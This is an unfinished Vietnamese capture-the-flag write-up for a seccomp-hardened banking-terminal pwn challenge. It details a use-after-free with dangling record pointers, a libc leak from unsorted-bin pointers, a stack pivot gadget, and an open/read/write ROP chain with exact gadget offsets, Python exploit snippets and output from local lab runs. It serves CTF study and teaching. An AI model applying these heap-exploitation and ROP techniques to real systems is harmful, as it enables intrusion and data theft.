# CCU Banking Access Terminal, Premium Tier (2/2) - Pwn (499)

**Flag:** chưa capture - chuỗi duy nhất đọc được là flag giả của lab local · **Điểm:** 499 · **Tác giả:** soup, adlee7
**Files:** `files/ccu-premium-terminal.zip` (1.127.978 B, sha256 `2e3e1d6f99afd93227d625cd55bc90a89d575d61e5af18ef49f2259d7c2529e8`)

> Bài này nằm trong `_wip/` vì chưa có cờ thật. Chuỗi khai thác đã được xác minh 5/5 lần
> chạy trên lab local (`analysis/service.py` + `analysis/flagfile.local`), phần còn thiếu
> là chạy `exploit.py` từ workstation của giải và ghi lại cờ. Toàn bộ số liệu và địa chỉ
> dưới đây lấy từ disassembly của artifact và output của lần chạy local đã lưu trong
> `analysis/local_run_output.bin`.

## Đề bài

Service `chal:2324` mô phỏng terminal ngân hàng 1997, nói chuyện bằng raw bytes. Đề cho
binary `ccu_premium`, libc Ubuntu GLIBC 2.35-0ubuntu3.15, loader và `libseccomp.so.2`.
Cờ nằm ở `/flag` trên host service. Đăng nhập bằng member `8802` / PIN `2049`.
Các mục menu yêu cầu "branch page" thì phải gửi đúng 384 byte thô, không phải một dòng.
Điểm mới so với bản tier 1: thêm seccomp-bpf (`install_filter` được gọi trước `do_login`)
và header in thêm dòng `TERMINAL HARDENING: ACTIVE`.

## Phân tích

`file` cho `ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped`, tức
**non-PIE**: mọi địa chỉ trong binary (`0x400000` + offset) là hằng số, không cần leak
text. `nm`/`objdump` cho thấy cấu trúc chương trình rất gọn:

```text
main:  drop_inherited_fds  limits  banner  install_filter  do_login  menu_loop
```

Bốn điểm bất thường định hướng toàn bộ lời giải:

1. `install_filter` @0x4014af: `seccomp_init(0x80000000)` (default `SCMP_ACT_KILL`) rồi
   vòng lặp `i <= 0xa` nạp 11 entry từ bảng `allowed.0` @0x404160. Dump đúng file offset
   `0x4160` ra 11 số syscall (little-endian dword):

```text
   00000000 01000000 02000000 01010000 08000000 05000000
   0c000000 09000000 0b000000 3c000000 e7000000
   ```

   Tức `read, write, open, openat, lseek, fstat, brk, mmap, munmap, exit, exit_group`.
   **Không có `execve`, không có `fork/clone`, và không có `mprotect` (10)** - nên các phương án cần những syscall này không dùng được. Việc thiếu `mprotect` riêng lẻ chưa loại trừ `mmap` với quyền executable. Chuỗi được sử dụng ở đây là ORW (open/read/write).

2. Mỗi record là một trang cố định: `open_account` @0x401f31 và `attach_memo` @0x402590
   đều `malloc(0x180)` rồi `read_full(ptr, 0x180)`. `read_full` @0x401693 là vòng
   `read(0, buf+done, remaining)` cho tới khi đủ 384 byte, không cắt theo `\n`.
   Nghĩa là ta ghi được **384 byte thô vào data trên heap**.

3. `show_summary` @0x401cab lặp qua **mọi** record (kể cả đã closed) và với mỗi record làm
   ba việc: `write(1, rec+0x10, 0x18)` in 24 byte thô của trang (primitive đọc bộ nhớ),
   gọi `money(rec, 0x30, rec+0x08)` in `rec+0x08` dưới dạng **số thập phân 64-bit đầy đủ**,
   rồi:

```asm
   401e9b: mov 0x28(%rax),%rdx     # rax = rec
   401ea3: mov %rax,%rdi           # rdi = rec
   401ea6: call *%rdx              # dividend callback
   ```

   `call *[rec+0x28]` với `rdi` trỏ đúng record: chiếm RIP và kiểm soát luôn con trỏ stack.

4. `close_account` @0x40223c gọi `free(accounts[i-1])`, đặt `closed[i]=1` nhưng **không xoá
   con trỏ** và không đổi `n_accounts` → `accounts[]` còn dangling pointer, và
   `show_summary` vẫn đi qua nó.

Ghép 2 + 3 + 4: nếu đóng record rồi attach memo, `malloc(0x180)` của memo sẽ lấy lại
chunk record vừa free (tcache LIFO, cùng size), và memo **không bị sửa field nào** khi nạp
(khác `open_account`), nên 384 byte của memo trở thành thân record với `+0x28` do ta chọn.

## Hướng đã thử

1. **Format string trong `show_summary`**: giả thuyết rằng `printf(branch_page)` dùng data
   của ta làm format. Sai. Chuỗi duy nhất in ra quanh giá trị là
   `0x4036f8 "PROJECTED PERIOD DIVIDEND : %.2f"` và các format `NICKNAME`/`BALANCE` đều là
   constant trong `.rodata`; binary **không có primitive format string nào**. Toàn bộ payload
   `%55$llx` / `%65$llx` gửi làm branch page không có tác dụng. Primitive leak thật là
   `money()` in `rec+0x08` và `write(1, rec+0x10, 0x18)`, không phải format string.
2. **Đoán bảng syscall mà không dump**: ban đầu đọc `allowed.0` như một dãy số nằm cạnh
   jump table và suy ra `9,15,16,21,23,25,32,37,38,42` (có `mprotect`), rồi lên kế hoạch
   `mmap` RWX + shellcode. Dump đúng offset `0x4160` (bảng ở mục Phân tích) cho thấy
   **không có syscall 10** (`mprotect`), phương án phụ thuộc `mprotect` không dùng được. Việc thiếu syscall này chưa tự loại trừ `mmap` với quyền executable.
3. **Tràn 384 byte để đè memos/accounts kế tiếp**: `read_full` đọc đúng số byte yêu cầu vào
   chunk `malloc(0x180)` (chunk thật 0x190 gồm header), không có linear overflow nào ra
   ngoài trang. Overwrite chỉ đến từ **tái sử dụng chunk**, không phải từ overflow.
4. **Đè `+0x28` trực tiếp trong branch page của record**: `open_account` sau khi đọc trang
   sẽ ghi đè `+0x00` (số hiệu), `+0x04` (loại - 1), `+0x08` (số dư đã nhân hệ số) và
   `+0x28 = RATE_TABLE[type-1]`, đồng thời `+0x27 = 0`. Giá trị ta đặt ở `+0x28` bị xoá.
   Vì vậy lời giải dùng type confusion qua memo.
5. **Vòng lặp callback offset với địa chỉ `0xdeadbeefcafe0000`**: do (4), các lần gửi này chỉ
   tiêu kết nối (login chỉ được 3 lần thử) chứ không map được layout.
6. **Lỗi khi thiết lập môi trường**: dán thẳng Python vào bash
   → `bash: from: command not found`; `io.recvuntil(b"> ")` → `EOFError` vì prompt thật là
   `Selection: `; `default.timeout = 10` → `NameError`, `context.default.timeout` →
   `AttributeError` (đúng là `context.timeout`); server cần timeout dài và đọc theo
   buffer chứ không theo dòng.

## Lời giải

**Bước 1 - Đưa 7 chunk vào tcache, 2 chunk xuống unsorted bin để leak libc.**
Mở 9 record, đóng cả 9 theo thứ tự. `n_accounts` không giảm nên 9 record vẫn được duyệt.
Hai chunk rơi xuống unsorted bin giữ con trỏ `bk` trỏ vào `main_arena` của libc;
`money()` in nguyên `rec+0x08` ra thập phân, đủ để tính base. Delta hiệu dụng cho đúng
bản libc này là `LIBC_BINS0 = 0x21ACE0` (calibrate bằng `/proc/<pid>/maps` trong lab).
Lọc ứng viên: `v >> 47 == 0` (canonical address) và `(v - 0x21ACE0) % 0x1000 == 0`.

```python
for _ in range(9):                       # 9 x malloc(0x180)
    send(s, b"2\n"); wait(s, st, b"Record type")
    send(s, b"1\n"); wait(s, st, b"Opening balance")
    send(s, b"0\n"); wait(s, st, b"PAGE>")
    send(s, b"A"*0x10 + b"\x00"*(384-0x10)); wait(s, st, b"Selection:")
for i in range(1, 10):                   # 7 -> tcache, 8,9 -> unsorted bin
    send(s, b"3\n"); wait(s, st, b"Record to close")
    send(s, b"%d\n" % i); wait(s, st, b"Selection:")
send(s, b"1\n")                          # show_summary: in rec+0x08 qua money()
```

Output thật từ lần chạy local (`analysis/local_run_output.bin`):

```text
[+] logged in
[+] 9 records opened
[+] 9 records closed
[*] libc base = 0x793845b9f000
```

**Bước 2 - Memo chiếm lại chunk record, đặt pivot vào `+0x28`.**
Không cần leak heap: `call *[rec+0x28]` đi kèm `rdi = rec`, và binary có sẵn
`mov rsp,rdi; ret` tại `0x401369` (dữ liệu thô đã kiểm chứng: `48 89 fc c3`).
Sau pivot, `rsp == rec`, nghĩa là **chính trang 384 byte trở thành stack ROP**:
RIP lấy từ `+0x00`, các slot tiếp theo ở `+0x08`, `+0x10`, ...

```python
PIVOT = 0x401369          # mov rsp,rdi ; ret
st["b"] = b""
send(s, b"5\n"); wait(s, st, b"PAGE>")
send(s, chain(libc)); wait(s, st, b"Selection:")
```

**Bước 3 - ROP orw trong libc.** Binary không có `syscall` instruction và không có
`pop rdi` (chỉ `ret`, `pop rbp;ret`, `leave;ret` và pivot), nên mọi gadget phải lấy từ
libc: `POP_RDI 0x2A3E5`, `POP_RSI 0x2BE51`, `POP_RAX 0x45EB0`, `POP_RDX 0x90469`
(phải dùng bản `pop rdx;pop rbx;ret`, libc này không có `pop rdx;ret`), `OPEN 0x114630`;
`read/write/exit` dùng PLT của binary (`0x401150 / 0x4010a0 / 0x401070`).
Chuỗi: `read(0, 0x406300, 8)` (ta gửi tiếp `"/flag\0\0\0"` sau khi trigger) →
`write(1, 0x406300, 8)` để xác nhận đã ghi được tên file → `open(0x406300, 0)` →
`read(3, 0x406340, 0x200)` → `write(1, 0x406340, 0x40)` → `_exit`.
`0x406300/0x406340` nằm trong trang RW cuối của binary (`.bss` kết thúc `0x406288` nhưng
page chạy tới `0x407000`); **không dùng `0x406018`** vì `.got.plt` ở đó đang chứa pointer
sống. fd luôn bằng 3 vì `drop_inherited_fds` đã đóng 3..255.
Slot `+0x28` bắt buộc phải bị tiêu bởi một `pop` đơn lẻ - trong script là
`pop rax;ret`; đặt `pop rsi;ret` vào đó là bug thật vì nó làm hỏng tham số buffer của `read()`.

Kết quả đọc về từ lần chạy local, với `/flag` được mount tới `analysis/flagfile.local`:

```text
  7) RECORD 1169986533  TYPE 31032      SHARE DRAFT    CLOSED
     BALANCE  : $0.00
/flag\x00\x00\x00cdctf{LOCAL_TEST_FLAG_abc123}\n
```

**Bước 4 - Kiểm chứng local.** Các kết quả đối chiếu: (a) giá trị
in ở `rec+0x08` thỏa điều kiện canonical và `== libc_base + 0x21ACE0`, số dư đúng theo
`mmap`-aligned; (b) bước echo `write(1, 0x406300, 8)` trả về đúng `"/flag\0\0\0"` trước khi
`open` chạy, chứng tỏ trang scratch ghi được; (c) nội dung in ra đúng 32 byte theo độ dài
`flagfile` local. Chuỗi chạy 5/5 lần liên tiếp trên lab.

## Kết quả

Chưa capture từ instance. Lab local chỉ đọc được flag tự dựng:

```bash
cat analysis/flagfile.local
```

```text
cdctf{LOCAL_FAKE_FLAG_not_real}
```

Để có cờ thật: bật instance, mở workstation, `cat > solve.py` rồi paste nội dung
`exploit.py` (đã đổi `HOST, PORT = "chal", 2324`), chạy, và ghi cờ vào `flag.txt` rồi
chuyển bài ra khỏi `_wip/`.

## Tái hiện

```bash
# Lab local: một terminal
python analysis/service.py 2324          # socket front-end, chạy ccu_premium qua ld shipped
# terminal khác, cwd có ccu_premium/libc/ld/libseccomp
python exploit.py                        # HOST, PORT = "chal", 2324 -> đổi sang 127.0.0.1
```

## Cần xác minh

- Cờ thật từ instance (đang thiếu, là lý do bài ở `_wip/`).
- Dòng `+0x28 = RATE_TABLE[type-1]` và `+0x27 = 0` trong `open_account`: suy ra từ lần chạy
  local (trang gửi trực tiếp không chiếm được callback) chứ chưa chỉ ra bằng từng dòng
  disassembly trong writeup này; bản listing đầy đủ ở `_scratch/ccu/dis.txt`.
- `limits()` đặt RLIMIT/alarm: chưa đọc lại từng giá trị trong bản ghi đã lưu.
